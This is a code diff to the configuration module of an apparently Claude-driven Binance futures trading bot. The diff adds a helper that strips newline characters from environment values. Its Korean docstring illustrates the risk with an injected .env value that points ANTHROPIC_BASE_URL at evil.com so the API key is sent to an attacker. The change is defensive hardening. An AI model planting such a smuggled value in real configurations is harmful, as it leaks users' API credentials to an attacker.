@@ -13,15 +13,29 @@ _BASE_DIR = Path(__file__).resolve().parent
 load_dotenv(_BASE_DIR / ".env")
 load_dotenv()
 
-CLAUDE_API_KEY = os.getenv("CLAUDE_API_KEY", "")
-FRED_API_KEY   = os.getenv("FRED_API_KEY", "")
-CLAUDE_MODEL   = os.getenv("CLAUDE_MODEL", "claude-sonnet-4-6")
+
+def _safe_env(key: str, default: str = "") -> str:
+    """환경변수를 읽고 CRLF 문자를 제거합니다.
+
+    .env 파일에 개행문자(\\n, \\r)가 포함된 값이 있으면
+    python-dotenv 가 추가 변수를 주입(CRLF Injection)할 수 있습니다.
+    예: CLAUDE_API_KEY=sk-xxx\\nANTHROPIC_BASE_URL=https://evil.com
+    → Claude SDK 가 공격자 서버로 API 키를 전송하는 취약점.
+    이를 방지하기 위해 모든 env 값에서 개행문자를 제거합니다.
+    """
+    val = os.getenv(key, default) or default
+    return val.replace("\r", "").replace("\n", "").strip()
+
+
+CLAUDE_API_KEY = _safe_env("CLAUDE_API_KEY")
+FRED_API_KEY   = _safe_env("FRED_API_KEY")
+CLAUDE_MODEL   = _safe_env("CLAUDE_MODEL", "claude-sonnet-4-6")
 
 BINANCE_BASE_URL    = "https://api.binance.com"
 BINANCE_FUTURES_URL = "https://fapi.binance.com"
-BINANCE_API_KEY     = os.getenv("BINANCE_API_KEY", "")
-BINANCE_SECRET_KEY  = os.getenv("BINANCE_SECRET_KEY", "")
-DEFAULT_SYMBOL      = os.getenv("DEFAULT_SYMBOL", "BTCUSDT").upper()
+BINANCE_API_KEY     = _safe_env("BINANCE_API_KEY")
+BINANCE_SECRET_KEY  = _safe_env("BINANCE_SECRET_KEY")
+DEFAULT_SYMBOL      = _safe_env("DEFAULT_SYMBOL", "BTCUSDT").upper()
 
 
 def symbol_to_pair(symbol: str) -> str:
@@ -37,32 +51,32 @@ DEFAULT_LEVERAGE      = 3       # 희망 레버리지 배수
 
 # ── 자동매매 설정 ──────────────────────────────
 # 모든 값은 .env 에서 환경변수로 오버라이드 가능
-AUTO_TRADE_ENABLED        = os.getenv("AUTO_TRADE_ENABLED", "0") not in ("0", "false", "no")
-AUTO_TRADE_DRY_RUN        = os.getenv("AUTO_TRADE_DRY_RUN", "1") not in ("0", "false", "no")
-AUTO_TRADE_MIN_CONFIDENCE = int(os.getenv("AUTO_TRADE_MIN_CONFIDENCE", "65"))   # 최소 확신도
-AUTO_TRADE_MIN_STRENGTH   = int(os.getenv("AUTO_TRADE_MIN_STRENGTH",   "2"))    # 최소 강도 (BUY=2, STRONG_BUY=3)
-AUTO_TRADE_RISK_PCT       = float(os.getenv("AUTO_TRADE_RISK_PCT",     "0.02")) # 진입당 리스크 비율 (2%)
-AUTO_TRADE_SL_ATR_MULT    = float(os.getenv("AUTO_TRADE_SL_ATR_MULT",  "1.0")) # 손절 = Claude 제안가 그대로
-AUTO_TRADE_TP_RR          = float(os.getenv("AUTO_TRADE_TP_RR",        "2.0")) # 익절 = 손절폭 × R:R
-AUTO_TRADE_MAX_LEVERAGE   = int(os.getenv("AUTO_TRADE_MAX_LEVERAGE",   "5"))    # 레버리지 상한
-AUTO_TRADE_COOLDOWN_MIN   = int(os.getenv("AUTO_TRADE_COOLDOWN_MIN",   "30"))   # 연속 거래 쿨다운(분)
-AUTO_TRADE_FLIP_GUARD     = os.getenv("AUTO_TRADE_FLIP_GUARD", "1") not in ("0", "false", "no")  # 즉시 반전 방지
+AUTO_TRADE_ENABLED        = _safe_env("AUTO_TRADE_ENABLED", "0") not in ("0", "false", "no")
+AUTO_TRADE_DRY_RUN        = _safe_env("AUTO_TRADE_DRY_RUN", "1") not in ("0", "false", "no")
+AUTO_TRADE_MIN_CONFIDENCE = int(_safe_env("AUTO_TRADE_MIN_CONFIDENCE", "65"))   # 최소 확신도
+AUTO_TRADE_MIN_STRENGTH   = int(_safe_env("AUTO_TRADE_MIN_STRENGTH",   "2"))    # 최소 강도 (BUY=2, STRONG_BUY=3)
+AUTO_TRADE_RISK_PCT       = float(_safe_env("AUTO_TRADE_RISK_PCT",     "0.02")) # 진입당 리스크 비율 (2%)
+AUTO_TRADE_SL_ATR_MULT    = float(_safe_env("AUTO_TRADE_SL_ATR_MULT",  "1.0")) # 손절 = Claude 제안가 그대로
+AUTO_TRADE_TP_RR          = float(_safe_env("AUTO_TRADE_TP_RR",        "2.0")) # 익절 = 손절폭 × R:R
+AUTO_TRADE_MAX_LEVERAGE   = int(_safe_env("AUTO_TRADE_MAX_LEVERAGE",   "5"))    # 레버리지 상한
+AUTO_TRADE_COOLDOWN_MIN   = int(_safe_env("AUTO_TRADE_COOLDOWN_MIN",   "30"))   # 연속 거래 쿨다운(분)
+AUTO_TRADE_FLIP_GUARD     = _safe_env("AUTO_TRADE_FLIP_GUARD", "1") not in ("0", "false", "no")  # 즉시 반전 방지
 
 # ── 동적 포지션 사이징 ──────────────────────
-AUTO_TRADE_DYNAMIC_SIZING  = os.getenv("AUTO_TRADE_DYNAMIC_SIZING", "1") not in ("0", "false", "no")
-AUTO_TRADE_RISK_MIN_PCT    = float(os.getenv("AUTO_TRADE_RISK_MIN_PCT", "0.02"))  # 확신도 최저 시 리스크 (2%)
-AUTO_TRADE_DRY_RUN_BALANCE = float(os.getenv("AUTO_TRADE_DRY_RUN_BALANCE", "10000"))  # 드라이런 가상 잔고 ($)
+AUTO_TRADE_DYNAMIC_SIZING  = _safe_env("AUTO_TRADE_DYNAMIC_SIZING", "1") not in ("0", "false", "no")
+AUTO_TRADE_RISK_MIN_PCT    = float(_safe_env("AUTO_TRADE_RISK_MIN_PCT", "0.02"))  # 확신도 최저 시 리스크 (2%)
+AUTO_TRADE_DRY_RUN_BALANCE = float(_safe_env("AUTO_TRADE_DRY_RUN_BALANCE", "10000"))  # 드라이런 가상 잔고 ($)
 
 # ── Claude 권장 레버리지 ────────────────────
-AUTO_TRADE_CLAUDE_LEVERAGE = os.getenv("AUTO_TRADE_CLAUDE_LEVERAGE", "1") not in ("0", "false", "no")
+AUTO_TRADE_CLAUDE_LEVERAGE = _safe_env("AUTO_TRADE_CLAUDE_LEVERAGE", "1") not in ("0", "false", "no")
 
 # ── 반전 매매 (신호 방향 전환 시 청산 후 재진입) ──
-AUTO_TRADE_REVERSAL_ENABLED     = os.getenv("AUTO_TRADE_REVERSAL_ENABLED", "1") not in ("0", "false", "no")
-AUTO_TRADE_REVERSAL_MIN_HOLD    = int(os.getenv("AUTO_TRADE_REVERSAL_MIN_HOLD",    "30"))  # 최소 보유 시간(분) — 휩소 방지
-AUTO_TRADE_REVERSAL_MIN_CONF    = int(os.getenv("AUTO_TRADE_REVERSAL_MIN_CONF",    "67"))  # 반전 최소 확신도 (진입보다 높게)
-AUTO_TRADE_REVERSAL_MAX_PER_DAY = int(os.getenv("AUTO_TRADE_REVERSAL_MAX_PER_DAY", "2"))   # 하루 최대 반전 횟수
+AUTO_TRADE_REVERSAL_ENABLED     = _safe_env("AUTO_TRADE_REVERSAL_ENABLED", "1") not in ("0", "false", "no")
+AUTO_TRADE_REVERSAL_MIN_HOLD    = int(_safe_env("AUTO_TRADE_REVERSAL_MIN_HOLD",    "30"))  # 최소 보유 시간(분) — 휩소 방지
+AUTO_TRADE_REVERSAL_MIN_CONF    = int(_safe_env("AUTO_TRADE_REVERSAL_MIN_CONF",    "67"))  # 반전 최소 확신도 (진입보다 높게)
+AUTO_TRADE_REVERSAL_MAX_PER_DAY = int(_safe_env("AUTO_TRADE_REVERSAL_MAX_PER_DAY", "2"))   # 하루 최대 반전 횟수
 
-OWNER_PASSWORD = os.getenv("OWNER_PASSWORD", "changeme")  # 주인장 확성기 비밀번호
+OWNER_PASSWORD = _safe_env("OWNER_PASSWORD", "changeme")  # 주인장 확성기 비밀번호
 
 # 분석할 시간봉 목록
 TIMEFRAMES = ["5m", "15m", "1h", "4h", "1d"]
